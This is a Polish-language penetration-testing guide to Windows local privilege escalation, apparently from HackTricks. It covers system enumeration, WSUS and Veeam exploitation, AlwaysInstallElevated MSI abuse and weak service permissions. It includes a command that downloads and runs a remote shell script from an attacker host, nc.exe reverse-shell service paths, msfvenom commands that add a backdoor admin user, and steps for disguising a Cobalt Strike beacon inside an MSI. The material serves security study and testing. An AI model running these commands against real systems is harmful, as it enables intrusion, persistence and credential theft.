# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania wektorów Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Podstawy Windows

### Access Tokens

**Jeśli nie wiesz, czym są Windows Access Tokens, przeczytaj następującą stronę przed kontynuowaniem:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Więcej informacji o ACLs - DACLs/SACLs/ACEs znajdziesz na następującej stronie:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Poziomy integralności

**Jeśli nie wiesz, czym są poziomy integralności w Windows, przeczytaj następującą stronę przed kontynuowaniem:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Mechanizmy kontroli bezpieczeństwa Windows

W Windows istnieją różne mechanizmy, które mogą **uniemożliwić enumerację systemu**, uruchamianie plików wykonywalnych, a nawet **wykryć Twoje działania**. Przed rozpoczęciem enumeracji dotyczącej privilege escalation powinieneś **przeczytać** następującą **stronę** i **wyliczyć** wszystkie te **mechanizmy** **obronne**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Ochrona administratora / ciche podnoszenie uprawnień UIAccess

Procesy UIAccess uruchamiane za pośrednictwem `RAiLaunchAdminProcess` mogą zostać wykorzystane do uzyskania High IL bez monitów, gdy mechanizmy sprawdzania bezpiecznych ścieżek AppInfo zostaną ominięte. Sprawdź dedykowany workflow omijania UIAccess/Admin Protection tutaj:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagacja wpisów rejestru dotyczących ułatwień dostępu w Secure Desktop może zostać wykorzystana do uzyskania dowolnego zapisu do rejestru SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Nowsze kompilacje Windows wprowadziły również ścieżkę **SMB arbitrary-port** prowadzącą do LPE, w której uprzywilejowane lokalne uwierzytelnianie NTLM jest przekazywane przez ponownie używane połączenie TCP SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacje o systemie

### Enumeracja informacji o wersji

Sprawdź, czy wersja Windows zawiera znaną lukę (sprawdź również zastosowane poprawki).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploity wersji

Ta [strona](https://msrc.microsoft.com/update-guide/vulnerability) jest przydatna do wyszukiwania szczegółowych informacji o podatnościach bezpieczeństwa firmy Microsoft. Ta baza danych zawiera ponad 4700 podatności bezpieczeństwa, pokazując **ogromną powierzchnię ataku**, jaką przedstawia środowisko Windows.

**W systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ma wbudowany watson)_

**Lokalnie, z wykorzystaniem informacji o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria exploitów na Githubie:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy w zmiennych środowiskowych zapisano jakieś dane uwierzytelniające/Juicy info?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia PowerShella
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Pliki transkrypcji PowerShell

Możesz dowiedzieć się, jak to włączyć, korzystając z [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Rejestrowanie modułów PowerShell

Szczegóły wykonywania potoków PowerShell są rejestrowane, w tym wykonane polecenia, wywołania poleceń oraz fragmenty skryptów. Jednak pełne szczegóły wykonywania i wyniki wyjściowe mogą nie zostać przechwycone.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji "Transcript files" dokumentacji, wybierając **"Module Logging"** zamiast **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Aby wyświetlić ostatnie 15 zdarzeń z logów PowerShell, możesz wykonać:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rejestrowany jest kompletny przebieg aktywności oraz pełna treść wykonywania skryptu, dzięki czemu każdy blok kodu jest dokumentowany w trakcie jego uruchamiania. Proces ten zachowuje kompleksowy ślad audytowy każdej aktywności, cenny w analizie kryminalistycznej i badaniu złośliwego działania. Dokumentowanie całej aktywności w momencie jej wykonywania zapewnia szczegółowy wgląd w przebieg procesu.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Zdarzenia rejestrowania dla Script Block można znaleźć w Podglądzie zdarzeń systemu Windows w ścieżce: **Dzienniki aplikacji i usług > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić 20 ostatnich zdarzeń, możesz użyć:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ustawienia internetowe
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Dyski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Możesz przejąć system, jeśli aktualizacje nie są żądane przy użyciu http**S**, lecz http.

Zacznij od sprawdzenia, czy sieć korzysta z aktualizacji WSUS bez SSL, uruchamiając w cmd następujące polecenie:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Lub następujące polecenie w PowerShellu:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Jeśli otrzymasz odpowiedź taką jak jedna z poniższych:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jest równe `1`.

Wtedy **jest to exploitable.** Jeśli ostatni wpis rejestru jest równy 0, wpis WSUS zostanie zignorowany.

Aby wykorzystać te vulnerabilities, możesz użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - są to weaponized MiTM exploit scripts służące do wstrzykiwania „fake” updates do nieszyfrowanego SSL traffic WSUS.

Przeczytaj research tutaj:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Zasadniczo jest to flaw wykorzystywany przez ten bug:

> Jeśli mamy możliwość modyfikowania proxy naszego local usera, a Windows Updates używa proxy skonfigurowanego w ustawieniach Internet Explorera, mamy tym samym możliwość lokalnego uruchomienia [PyWSUS](https://github.com/GoSecure/pywsus) w celu przechwycenia własnego trafficu i wykonania kodu jako elevated user na naszym asset.
>
> Ponadto, ponieważ usługa WSUS używa ustawień bieżącego użytkownika, użyje również jego certificate store. Jeśli wygenerujemy self-signed certificate dla hostname WSUS i dodamy ten certificate do certificate store bieżącego użytkownika, będziemy mogli przechwytywać zarówno HTTP, jak i HTTPS traffic WSUS. WSUS nie używa mechanizmów podobnych do HSTS do implementowania walidacji typu trust-on-first-use certificate. Jeśli przedstawiony certificate jest trusted przez użytkownika i ma poprawny hostname, zostanie zaakceptowany przez usługę.

Możesz wykorzystać tę vulnerability za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie liberated).

## Automatyczne aktualizatory firm trzecich i Agent IPC (local privesc)

Wiele enterprise agents udostępnia localhost IPC surface oraz privileged update channel. Jeśli enrollment może zostać coerced do attacker servera, a updater ufa rogue root CA lub stosuje weak signer checks, local user może dostarczyć malicious MSI, który usługa SYSTEM zainstaluje. Zobacz uogólnioną technique (opartą na chainie Netskope stAgentSvc - CVE-2025-0309) tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM przez TCP 9401)

Veeam B&R < `11.0.1.1261` udostępnia localhost service na **TCP/9401**, który przetwarza attacker-controlled messages, umożliwiając wykonywanie arbitrary commands jako **NT AUTHORITY\SYSTEM**.

- **Recon**: potwierdź listener i version, np. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: umieść PoC, taki jak `VeeamHax.exe`, wraz z wymaganymi Veeam DLLs w tym samym directory, a następnie triggeruj SYSTEM payload przez local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Usługa wykonuje polecenie jako SYSTEM.
## KrbRelayUp

W określonych warunkach w środowiskach Windows **domain** występuje luka umożliwiająca **local privilege escalation**. Warunki te obejmują środowiska, w których **LDAP signing nie jest wymuszane,** użytkownicy posiadają self-rights pozwalające im konfigurować **Resource-Based Constrained Delegation (RBCD)** oraz istnieje możliwość tworzenia komputerów w domenie. Należy zauważyć, że te **wymagania** są spełnione przy użyciu **default settings**.

Znajdź **exploit w** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Więcej informacji o przebiegu ataku znajdziesz tutaj: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Jeśli** te 2 rejestry są **włączone** (wartość to **0x1**), użytkownicy z dowolnym poziomem uprawnień mogą **instalować** (wykonywać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Payloady Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę za pomocą modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu binarny plik Windows MSI w celu eskalacji uprawnień. Ten skrypt zapisuje prekompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (dlatego będziesz potrzebować dostępu GIU):
```
Write-UserAddMSI
```
Po prostu uruchom utworzony binary, aby eskalować uprawnienia.

### MSI Wrapper

Przeczytaj ten tutorial, aby dowiedzieć się, jak utworzyć MSI wrapper za pomocą tych tools. Pamiętaj, że możesz opakować plik "**.bat**", jeśli **chcesz tylko** **wykonywać** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Utwórz MSI za pomocą WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Utwórz MSI za pomocą Visual Studio

- Wygeneruj za pomocą Cobalt Strike lub Metasploit **nowy Windows EXE TCP payload** w `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz „installer” w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, na przykład **AlwaysPrivesc**, użyj **`C:\privesc`** jako lokalizacji, zaznacz **place solution and project in the same directory** i kliknij **Create**.
- Klikaj **Next**, aż dojdziesz do kroku 3 z 4 (wybór plików do dołączenia). Kliknij **Add** i wybierz właśnie wygenerowany Beacon payload. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer** i w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
- Możesz zmienić również inne właściwości, takie jak **Author** i **Manufacturer**, dzięki czemu zainstalowana aplikacja może wyglądać bardziej wiarygodnie.
- Kliknij projekt prawym przyciskiem myszy i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem myszy **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz plik **beacon.exe** i kliknij **OK**. Zapewni to wykonanie Beacon payload natychmiast po uruchomieniu installera.
- W **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **zbuduj go**.
- Jeśli zostanie wyświetlone ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że platforma jest ustawiona na x64.

### Instalacja MSI

Aby wykonać **instalację** złośliwego pliku `.msi` w **tle**:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Aby wykorzystać tę lukę, możesz użyć: _exploit/windows/local/always_install_elevated_

## Antivirus i detektory

### Ustawienia audytu

Te ustawienia decydują o tym, co jest **rejestrowane**, dlatego należy zwrócić uwagę
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — warto wiedzieć, dokąd wysyłane są logi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** służy do **zarządzania hasłami lokalnych administratorów**, zapewniając, że każde hasło jest **unikalne, losowe i regularnie aktualizowane** na komputerach dołączonych do domeny. Hasła te są bezpiecznie przechowywane w Active Directory i mogą być dostępne wyłącznie dla użytkowników, którym przyznano wystarczające uprawnienia za pośrednictwem ACLs, umożliwiające im wyświetlanie haseł lokalnych administratorów, jeśli są do tego upoważnieni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli jest aktywne, **hasła w postaci zwykłego tekstu są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Począwszy od **Windows 8.1**, firma Microsoft wprowadziła ulepszoną ochronę Local Security Authority (LSA), aby **blokować** próby **odczytu pamięci** przez niezaufane procesy lub wstrzykiwania kodu, dodatkowo zwiększając bezpieczeństwo systemu.\
[**Więcej informacji o LSA Protection znajdziesz tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

**Credential Guard** został wprowadzony w **Windows 10**. Jego celem jest ochrona danych uwierzytelniających przechowywanych na urządzeniu przed zagrożeniami takimi jak ataki pass-the-hash.| [**Więcej informacji o Credential Guard tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Dane uwierzytelniające domeny** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez komponenty systemu operacyjnego. Gdy dane logowania użytkownika zostaną uwierzytelnione przez zarejestrowany pakiet zabezpieczeń, dane uwierzytelniające domeny dla tego użytkownika są zazwyczaj tworzone.\
[**Więcej informacji o Cached Credentials znajdziesz tutaj**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Użytkownicy i grupy

### Enumerowanie użytkowników i grup

Należy sprawdzić, czy którakolwiek z grup, do których należysz, ma interesujące uprawnienia.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Uprzywilejowane grupy

Jeśli **należysz do uprzywilejowanej grupy, możesz mieć możliwość eskalacji uprawnień**. Dowiedz się więcej o uprzywilejowanych grupach i o tym, jak je wykorzystywać do eskalacji uprawnień:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulowanie tokenami

**Dowiedz się więcej** o tym, czym jest **token**, na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sprawdź poniższą stronę, aby **dowiedzieć się więcej o interesujących tokenach** i o tym, jak je wykorzystywać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / sesje
```bash
qwinsta
klist sessions
```
### Foldery domowe
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Polityka haseł
```bash
net accounts
```
### Pobierz zawartość schowka
```bash
powershell -command "Get-Clipboard"
```
## Uruchomione procesy

### Uprawnienia do plików i folderów

Przede wszystkim, podczas wyświetlania procesów **sprawdź hasła w wierszu poleceń procesu**.\
Sprawdź, czy możesz **nadpisać jakiś uruchomiony plik binarny** lub czy masz uprawnienia zapisu do folderu pliku binarnego, aby wykorzystać potencjalne [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Zawsze sprawdzaj, czy działają [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md), ponieważ można je wykorzystać do eskalacji uprawnień.

**Sprawdzanie uprawnień plików binarnych procesów**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Sprawdzanie uprawnień do folderów plików binarnych procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Wydobywanie haseł z pamięci

Możesz utworzyć zrzut pamięci uruchomionego procesu za pomocą **procdump** z sysinternals. Usługi takie jak FTP przechowują **dane uwierzytelniające w postaci jawnego tekstu w pamięci** — spróbuj zrzucić pamięć i odczytać dane uwierzytelniające.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Niebezpieczne aplikacje GUI

**Aplikacje uruchomione jako SYSTEM mogą pozwalać użytkownikowi na uruchomienie CMD lub przeglądanie katalogów.**

Przykład: „Windows Help and Support” (Windows + F1), wyszukaj „command prompt”, kliknij „Click to open Command Prompt”

## Services

Service Triggers pozwalają systemowi Windows uruchamiać usługę, gdy wystąpią określone warunki (aktywność named pipe/RPC endpoint, zdarzenia ETW, dostępność adresu IP, podłączenie urządzenia, odświeżenie GPO itd.). Nawet bez uprawnień SERVICE_START często można uruchamiać uprzywilejowane usługi, wyzwalając ich triggery. Techniki enumeracji i aktywacji znajdziesz tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

Uzyskaj listę usług:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze
```bash
sc qc <service_name>
```
Zaleca się posiadanie pliku binarnego **accesschk** z _Sysinternals_ w celu sprawdzenia wymaganego poziomu uprawnień dla każdej usługi.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Zaleca się sprawdzenie, czy „Authenticated Users” mogą modyfikować dowolną usługę:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Możesz pobrać accesschk.exe dla XP stąd](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włączanie usługi

Jeśli pojawia się ten błąd (na przykład w przypadku SSDPSRV):

_Błąd systemu 1058 wystąpił._\
_Usługa nie może zostać uruchomiona, ponieważ jest wyłączona lub nie ma powiązanych z nią włączonych urządzeń._

Możesz ją włączyć za pomocą
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Należy pamiętać, że usługa upnphost zależy od SSDPSRV, aby działać (w przypadku XP SP1)**

**Innym obejściem** tego problemu jest uruchomienie:
```
sc.exe config usosvc start= auto
```
### **Modyfikacja ścieżki pliku binarnego usługi**

W scenariuszu, w którym grupa „Authenticated users” posiada uprawnienie **SERVICE_ALL_ACCESS** do usługi, możliwa jest modyfikacja pliku wykonywalnego usługi. Aby zmodyfikować i uruchomić **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Ponowne uruchomienie usługi
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Uprawnienia można eskalować za pomocą różnych uprawnień:

- **SERVICE_CHANGE_CONFIG**: Umożliwia rekonfigurację pliku binarnego usługi.
- **WRITE_DAC**: Umożliwia rekonfigurację uprawnień, co prowadzi do możliwości zmiany konfiguracji usług.
- **WRITE_OWNER**: Umożliwia przejęcie własności i rekonfigurację uprawnień.
- **GENERIC_WRITE**: Zapewnia odziedziczoną możliwość zmiany konfiguracji usług.
- **GENERIC_ALL**: Również zapewnia odziedziczoną możliwość zmiany konfiguracji usług.

Do wykrywania i wykorzystywania tej podatności można użyć _exploit/windows/local/service_permissions_.

### Słabe uprawnienia plików binarnych usług

Jeśli usługa działa jako **`LocalSystem`**, **`LocalService`**, **`NetworkService`** lub uprzywilejowane konto domenowe, ale **użytkownicy z niskimi uprawnieniami mogą modyfikować plik EXE usługi lub jego folder nadrzędny**, często można przejąć usługę, **zastępując plik binarny i ponownie uruchamiając usługę**.

**Sprawdź, czy możesz modyfikować plik binarny wykonywany przez usługę** lub czy masz **uprawnienia zapisu do folderu**, w którym znajduje się plik binarny ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Możesz pobrać każdy plik binarny wykonywany przez usługę za pomocą **wmic** (nie w system32) i sprawdzić swoje uprawnienia za pomocą **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Możesz również użyć **sc** i **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Poszukaj niebezpiecznych ACL przyznanych **`Everyone`**, **`BUILTIN\Users`** lub **`Authenticated Users`**, zwłaszcza **`(F)`**, **`(M)`** lub **`(W)`** dla pliku wykonywalnego usługi albo katalogu, który go zawiera. Praktyczny przebieg wykorzystania:

1. Potwierdź konto usługi i ścieżkę do pliku wykonywalnego za pomocą `sc qc <service_name>`.
2. Potwierdź, że plik binarny jest zapisywalny, za pomocą `icacls <path>`.
3. Zastąp plik binarny usługi payloadem lub prawidłowym złośliwym plikiem binarnym usługi.
4. Uruchom usługę ponownie za pomocą `sc stop <service_name> && sc start <service_name>` (albo zaczekaj na ponowne uruchomienie systemu / wyzwolenie usługi).

Przydatne automatyczne kontrole:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Jeśli usługa nie pozwala zwykłemu użytkownikowi na jej ponowne uruchomienie, sprawdź, czy uruchamia się automatycznie podczas rozruchu, ma ustawioną akcję w przypadku awarii, która uruchamia ją ponownie, lub może zostać pośrednio wyzwolona przez korzystającą z niej aplikację.

### Uprawnienia do modyfikowania rejestru usług

Powinieneś sprawdzić, czy możesz modyfikować rejestr dowolnej usługi.\
Możesz **sprawdzić** swoje **uprawnienia** do **rejestru** usługi, wykonując:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Należy sprawdzić, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** posiadają uprawnienia `FullControl`. Jeśli tak, można zmodyfikować plik binarny uruchamiany przez usługę.

Aby zmienić ścieżkę pliku binarnego uruchamianego przez usługę:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Wyścig symlinków rejestru umożliwiający dowolny zapis wartości HKLM (ATConfig)

Niektóre funkcje ułatwień dostępu systemu Windows tworzą klucze **ATConfig** dla poszczególnych użytkowników, które są później kopiowane przez proces **SYSTEM** do klucza sesji HKLM. Wyścig **symbolicznego linku** w rejestrze może przekierować ten uprzywilejowany zapis do **dowolnej ścieżki HKLM**, zapewniając prymityw umożliwiający **zapis dowolnej wartości** HKLM.

Kluczowe lokalizacje (przykład: Klawiatura ekranowa `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` zawiera listę zainstalowanych funkcji ułatwień dostępu.
